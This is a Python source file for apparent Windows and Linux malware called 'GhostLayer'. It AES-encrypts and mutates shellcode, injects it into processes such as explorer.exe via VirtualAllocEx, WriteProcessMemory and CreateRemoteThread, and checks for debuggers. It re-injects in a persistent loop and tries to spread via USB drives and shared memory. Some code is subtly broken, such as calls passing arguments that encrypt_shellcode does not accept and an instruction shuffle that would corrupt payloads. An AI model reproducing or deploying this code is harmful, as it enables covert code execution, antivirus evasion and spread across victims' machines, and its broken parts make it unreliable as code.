import ctypes
import ctypes.wintypes as wintypes
import os
import base64
import random
import psutil
import time
import shutil
import mmap
import threading
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# Constants
ENCRYPTION_KEY = b"blackrootsecret!"  # 16 bytes (AES-128)
AES_BLOCK_SIZE = 16

class GhostLayer:
    def __init__(self):
        self.shellcode = b""

    def load_shellcode(self, source, is_base64=False):
        if is_base64:
            decoded = base64.b64decode(source)
        else:
            with open(source, "rb") as f:
                decoded = f.read()
        self.shellcode = decoded
        print(f"[📁] Loaded shellcode ({len(self.shellcode)} bytes)")

    def encrypt_shellcode(self):
        cipher = AES.new(ENCRYPTION_KEY, AES.MODE_CBC)
        ct_bytes = cipher.encrypt(pad(self.shellcode, AES_BLOCK_SIZE))
        return cipher.iv + ct_bytes

    def decrypt_shellcode(self, encrypted_data):
        iv = encrypted_data[:AES_BLOCK_SIZE]
        cipher = AES.new(ENCRYPTION_KEY, AES.MODE_CBC, iv)
        return unpad(cipher.decrypt(encrypted_data[AES_BLOCK_SIZE:]), AES_BLOCK_SIZE)

    def mutate_shellcode(self):
        mutated = bytearray(self.shellcode)
        for _ in range(random.randint(1, 5)):
            pos = random.randint(0, len(mutated) - 1)
            mutated.insert(pos, 0x90)
        self.shellcode = bytes(mutated)
        print(f"[mutations] Shellcode mutated to {len(self.shellcode)} bytes")

    def find_target_process(self):
        preferred = ["notepad.exe", "explorer.exe", "python.exe"]
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'] and proc.info['name'].lower() in preferred:
                print(f"[🧠] Found target: {proc.info['name']} (PID {proc.info['pid']})")
                return proc.info['pid']
        raise RuntimeError("No suitable process found.")

    def inject_into_pid(self, pid: int, encrypted_shellcode: bytes):
        decrypted = self.decrypt_shellcode(encrypted_shellcode)
        print(f"[👻] Injecting {len(decrypted)} bytes into PID {pid}...")

        PROCESS_ALL_ACCESS = 0x1F0FFF
        MEM_COMMIT_RESERVE = 0x3000
        PAGE_EXECUTE_READWRITE = 0x40

        kernel32 = ctypes.windll.kernel32
        h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
        if not h_process:
            raise RuntimeError(f"Failed to open PID {pid}")

        addr = kernel32.VirtualAllocEx(h_process, None, len(decrypted), MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE)
        if not addr:
            kernel32.CloseHandle(h_process)
            raise RuntimeError("Remote memory allocation failed.")

        written = wintypes.SIZE_T(0)
        if not kernel32.WriteProcessMemory(h_process, addr, decrypted, len(decrypted), ctypes.byref(written)):
            kernel32.CloseHandle(h_process)
            raise RuntimeError("Shellcode write failed.")

        thread_id = wintypes.DWORD(0)
        if not kernel32.CreateRemoteThread(h_process, None, 0, addr, None, 0, ctypes.byref(thread_id)):
            kernel32.CloseHandle(h_process)
            raise RuntimeError("Remote thread creation failed.")

        print(f"[⚙️] Shellcode injected and executed in PID {pid}")
        kernel32.CloseHandle(h_process)

    def scrub_memory(self, data):
        ctypes.memset(id(data), 0, ctypes.sizeof(data))

    def obfuscate_string(self, s):
        key = 0x55
        return bytes([b ^ key for b in s.encode()])

    def anti_debug_check(self):
        if ctypes.windll.kernel32.IsDebuggerPresent():
            raise RuntimeError("Debugger detected!")

    def inject_linux_payload(self, pid, shellcode):
        with open(f"/proc/{pid}/mem", "r+b") as mem:
            addr = os.lseek(mem.fileno(), 0, os.SEEK_END)
            os.lseek(mem.fileno(), addr, os.SEEK_SET)
            os.write(mem.fileno(), shellcode)

    def inject_chain_payload(self, pid, payloads):
        for payload in payloads:
            encrypted = self.encrypt_shellcode(payload)
            self.inject_into_pid(pid, encrypted)

class GhostLayerDaemon:
    def __init__(self, ghost_layer):
        self.ghost_layer = ghost_layer

    def run(self):
        while True:
            try:
                pid = self.ghost_layer.find_target_process()
                encrypted_shellcode = self.ghost_layer.encrypt_shellcode()
                self.ghost_layer.inject_into_pid(pid, encrypted_shellcode)
            except Exception as e:
                print(f"[!] Error: {e}")
            time.sleep(60)

class SelfLearningInjection:
    def __init__(self):
        self.heuristics = [
            {"technique": "randomize_nops", "probability": 0.5},
            {"technique": "change_instruction_order", "probability": 0.3},
            {"technique": "insert_obfuscated_strings", "probability": 0.2}
        ]

    def apply_heuristics(self, shellcode):
        for heuristic in self.heuristics:
            if random.random() < heuristic["probability"]:
                shellcode = self._apply_technique(shellcode, heuristic["technique"])
        return shellcode

    def _apply_technique(self, shellcode, technique):
        if technique == "randomize_nops":
            return self._randomize_nops(shellcode)
        elif technique == "change_instruction_order":
            return self._change_instruction_order(shellcode)
        elif technique == "insert_obfuscated_strings":
            return self._insert_obfuscated_strings(shellcode)
        return shellcode

    def _randomize_nops(self, shellcode):
        mutated = bytearray(shellcode)
        for _ in range(random.randint(1, 5)):
            pos = random.randint(0, len(mutated) - 1)
            mutated.insert(pos, 0x90)
        return bytes(mutated)

    def _change_instruction_order(self, shellcode):
        instructions = [shellcode[i:i+4] for i in range(0, len(shellcode), 4)]
        random.shuffle(instructions)
        return b''.join(instructions)

    def _insert_obfuscated_strings(self, shellcode):
        obfuscated = self.obfuscate_string("example_string")
        return shellcode + obfuscated

    def obfuscate_string(self, s):
        key = 0x55
        return bytes([b ^ key for b in s.encode()])

def spread_via_usb(payload_path):
    usb_path = "/media/usb"
    if os.path.exists(usb_path):
        shutil.copy(payload_path, usb_path)

def spread_via_shared_memory(payload):
    with mmap.mmap(-1, len(payload), tagname="shared_memory") as mm:
        mm.write(payload)

class GhostHive:
    def __init__(self, agents):
        self.agents = agents

    def run(self):
        threads = []
        for agent in self.agents:
            thread = threading.Thread(target=agent.run, daemon=True)
            thread.start()
            threads.append(thread)
        for thread in threads:
            thread.join()

if __name__ == "__main__":
    ghost = GhostLayer()
    ghost.load_shellcode("payload.bin")
    ghost.mutate_shellcode()
    encrypted = ghost.encrypt_shellcode()
    pid = ghost.find_target_process()
    ghost.inject_into_pid(pid, encrypted)

    self_learning = SelfLearningInjection()
    mutated_shellcode = self_learning.apply_heuristics(ghost.shellcode)
    encrypted_mutated = ghost.encrypt_shellcode(mutated_shellcode)
    ghost.inject_into_pid(pid, encrypted_mutated)

    daemon = GhostLayerDaemon(ghost)
    daemon.run()

    agents = [GhostLayer() for _ in range(5)]
    for agent in agents:
        agent.load_shellcode("payload.bin")
        agent.mutate_shellcode()
    ghost_hive = GhostHive(agents)
    ghost_hive.run()

    spread_via_usb("payload.bin")
    spread_via_shared_memory(encrypted)
